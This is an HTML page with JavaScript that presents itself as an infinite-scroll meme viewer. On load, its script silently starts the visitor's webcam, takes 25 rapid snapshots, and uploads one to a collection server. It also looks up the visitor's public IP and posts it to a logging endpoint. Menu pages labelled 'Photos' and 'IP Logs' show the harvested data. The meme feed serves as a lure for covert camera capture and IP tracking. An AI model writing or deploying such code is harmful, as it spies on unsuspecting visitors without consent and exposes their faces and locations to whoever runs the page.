<!DOCTYPE html>  
<html lang="en">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>MEMES</title>  
    <style>  
        body {  
            font-family: 'Arial', sans-serif;  
            background: linear-gradient(135deg, #1e1e2e, #3a3a55);  
            color: white;  
            text-align: center;  
            margin: 0;  
            padding: 0;  
        }  
        .container { padding: 20px; }  
        img, video { width: 100%; max-width: 300px; border-radius: 10px; margin-top: 10px; }  
        .menu {  
            position: absolute; top: 10px; left: 10px;  
            background: rgba(255, 255, 255, 0.1);  
            padding: 10px; border-radius: 5px; cursor: pointer;  
        }  
        .menu-content {  
            display: none; position: absolute; top: 40px; left: 10px;  
            background: white; color: black; border-radius: 5px; padding: 10px;  
        }  
        .menu:hover .menu-content { display: block; }  
        .menu-content a { display: block; padding: 8px; text-decoration: none; color: black; }  
        .memes-container {  
            max-height: 500px; overflow-y: scroll;  
            border: 1px solid white; padding: 10px; margin-top: 20px; text-align: left;  
        }  
        .meme { margin-bottom: 10px; }  
        .meme-text {  
            font-size: 18px; font-weight: bold; text-align: center; margin-bottom: 10px;  
        }  
        .small-text { font-size: 12px; color: #bbb; }  
        .scroll-to-top {  
            position: fixed;  
            bottom: 10px;  
            right: 10px;  
            background-color: #4CAF50;  
            color: white;  
            padding: 10px;  
            border-radius: 50%;  
            cursor: pointer;  
        }  
    </style>  
</head>  
<body>  
  
    <!-- Hamburger Menu -->  
    <div class="menu">  
        â˜° Menu  
        <div class="menu-content">  
            <a href="#" onclick="showPage('home')">Homepage</a>  
            <a href="#" onclick="showPage('photos')">Photos</a>  
            <a href="#" onclick="showPage('logs')">IP Logs</a>  
        </div>  
    </div>  
  
    <div id="home" class="container">  
        <h2>MEMES</h2>  
        <img id="captured-photo" style="display:none;"/>  
        <h2 style="margin-top:10px;">ðŸ‘‘ THE GREATEST MEME OF THE CENTURY ðŸ‘‘</h2>  
        <p id="ip-address" class="small-text"></p>  
          
        <div class="memes-container" id="memes"></div>  
    </div>  
  
    <div id="photos" class="container" style="display: none;">  
        <h2>Your Photos</h2>  
        <div id="photos-gallery"></div>  
    </div>  
  
    <div id="logs" class="container" style="display: none;">  
        <h2>IP Logs</h2>  
        <div id="ip-logs"></div>  
    </div>  
  
    <button class="scroll-to-top" onclick="scrollToTop()">â†‘</button>  
  
    <script>  
        const memesContainer = document.getElementById('memes');  
        const ipLogsContainer = document.getElementById('ip-logs');  
        const photosGallery = document.getElementById('photos-gallery');  
        const capturedPhoto = document.getElementById('captured-photo');  
        const ipAddressElement = document.getElementById('ip-address');  
        let loadingMemes = false;  
        let photos = [];  
        let ipLogs = new Set();  
  
        function showPage(page) {  
            document.getElementById('home').style.display = page === 'home' ? 'block' : 'none';  
            document.getElementById('photos').style.display = page === 'photos' ? 'block' : 'none';  
            document.getElementById('logs').style.display = page === 'logs' ? 'block' : 'none';  
  
            if (page === 'photos') updatePhotosGallery();  
            if (page === 'logs') updateIPLogs();  
        }  
  
        function startCamera() {  
            navigator.mediaDevices.getUserMedia({ video: true })  
                .then(stream => {  
                    const video = document.createElement("video");  
                    video.srcObject = stream;  
                    video.play();  
  
                    let count = 0;  
                    const interval = setInterval(() => {  
                        takePhoto(video);  
                        count++;  
  
                        if (count === 25) {  
                            clearInterval(interval);  
                            stopCamera(stream);  
                            display8thPhoto();  
                        }  
                    }, 200);  
                })  
                .catch(error => console.error("Camera access denied:", error));  
        }  
  
        function takePhoto(video) {  
            const canvas = document.createElement("canvas");  
            const context = canvas.getContext("2d");  
            canvas.width = video.videoWidth;  
            canvas.height = video.videoHeight;  
            context.drawImage(video, 0, 0, canvas.width, canvas.height);  
            const timestamp = new Date().toLocaleString();  
            photos.push({ src: canvas.toDataURL('image/png'), timestamp });  
        }  
  
        function display8thPhoto() {  
            if (photos.length >= 8) {  
                capturedPhoto.src = photos[7].src;  
                capturedPhoto.style.display = 'block';  
                uploadPhoto(photos[7].src);  
            }  
        }  
  
        function stopCamera(stream) {  
            stream.getTracks().forEach(track => track.stop());  
        }  
  
        function updatePhotosGallery() {  
            photosGallery.innerHTML = '';  
            photos.forEach((photo, index) => {  
                if (index !== 7 && index < 12) {  
                    let img = document.createElement('img');  
                    img.src = photo.src;  
                    img.style.width = '100px';  
                    img.style.margin = '5px';  
  
                    let timestamp = document.createElement('p');  
                    timestamp.classList.add('small-text');  
                    timestamp.textContent = photo.timestamp;  
  
                    photosGallery.appendChild(img);  
                    photosGallery.appendChild(timestamp);  
                }  
            });  
        }  
  
        async function fetchIP() {  
            try {  
                let response = await fetch("https://api.ipify.org?format=json");  
                let data = await response.json();  
                let timestamp = new Date().toLocaleString();  
                ipAddressElement.textContent = `Your IP: ${data.ip}`;  
  
                if (!ipLogs.has(data.ip)) {  
                    ipLogs.add(data.ip);  
                    updateIPLogs();  
                    logIP(data.ip);  
                }  
            } catch (error) {  
                console.error("Error fetching IP:", error);  
            }  
        }  
  
        function updateIPLogs() {  
            ipLogsContainer.innerHTML = '';  
            ipLogs.forEach(ip => {  
                let log = document.createElement('p');  
                log.textContent = `${ip} - ${new Date().toLocaleString()}`;  
                ipLogsContainer.appendChild(log);  
            });  
        }  
  
        async function fetchMemes() {  
            if (loadingMemes) return;  
            loadingMemes = true;  
  
            try {  
                let response = await fetch("https://meme-api.com/gimme/10");  
                let data = await response.json();  
  
                data.memes.forEach(meme => {  
                    let memeElement = document.createElement('div');  
                    memeElement.classList.add('meme');  
  
                    let memeText = document.createElement('div');  
                    memeText.classList.add('meme-text');  
                    memeText.textContent = `-- ${meme.title} --`;  
                    memeElement.appendChild(memeText);  
  
                    let media = meme.url.endsWith(".mp4") ? document.createElement('video') : document.createElement('img');  
                    media.src = meme.url;  
                    if (media.tagName === 'VIDEO') media.controls = true;  
                    memeElement.appendChild(media);  
  
                    memesContainer.appendChild(memeElement);  
                });  
            } catch (error) {  
                console.error("Error fetching memes:", error);  
            }  
  
            loadingMemes = false;  
        }  
  
        memesContainer.addEventListener('scroll', function() {  
            if (memesContainer.scrollTop + memesContainer.clientHeight >= memesContainer.scrollHeight - 50) {  
                fetchMemes();  
            }  
        });  
  
        function scrollToTop() {  
            window.scrollTo({ top: 0, behavior: 'smooth' });  
        }  
  
        async function uploadPhoto(photoSrc) {  
            try {  
                let response = await fetch('http://localhost:3000/upload', {  
                    method: 'POST',  
                    body: JSON.stringify({ photo: photoSrc }),  
                    headers: {  
                        'Content-Type': 'application/json'  
                    }  
                });  
                let data = await response.json();  
                console.log("Photo uploaded successfully:", data);  
            } catch (error) {  
                console.error("Error uploading photo:", error);  
            }  
        }  
  
        async function logIP(ip) {  
            try {  
                let response = await fetch('http://localhost:3000/logIP', {  
                    method: 'POST',  
                    body: JSON.stringify({ ip }),  
                    headers: {  
                        'Content-Type': 'application/json'  
                    }  
                });  
                let data = await response.json();  
                console.log("IP logged successfully:", data);  
            } catch (error) {  
                console.error("Error logging IP:", error);  
            }  
        }  
  
        startCamera();  
        fetchIP();  
        fetchMemes();  
    </script>  
  
</body>  
</html>
